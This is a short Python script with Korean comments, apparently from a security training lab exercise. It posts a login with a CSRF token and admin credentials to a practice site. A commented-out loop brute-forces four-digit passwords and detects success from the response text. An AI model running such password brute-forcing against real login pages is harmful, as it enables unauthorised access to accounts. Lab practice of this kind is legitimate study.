import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # 인증서 없을 때 오류 안보이게 함

##### csrf 문제

session = requests.session()
urls = "https://lab.eqst.co.kr:8110/practice/practice03/login"
head = {
    "Host":"lab.eqst.co.kr:8110",
    "Content-Type":"application/x-www-form-urlencoded"
}
# cooki = {
#     "JSESSIONID":"BA218C3A49B6F68F6970953861FDF354"
# }

pa={
    "_csrf":"736f16f0-97b7-453d-ae94-2e531b82c1c6",
    "memberid":"admin",
    "password": "1234"
}
# csrf: 변하는 값

res = session.post(urls,data=pa,headers=head,verify=False, allow_redirects=False)
print(res.text)

session.close()

# for i in range(0000,1000):
#     pas = str(i).zfill(4) # 0을 붙여서 4자리로 맞추고, 형 변환
#     pa['password'] = pas # 딕셔너리 타입의 변수 변화
#     res = requests.post(urls,params=pa,headers=head,cookies=cooki, verify=False)
#     if '<label for="password" class="form-label">비밀번호</label>' in res.text:
#         print(f'wrong {pas}')
#     elif res==302:
#         print('페이지 에러!')
#         break
#     else:
#         print(f'{pas} - 비밀번호 획득!')
#         break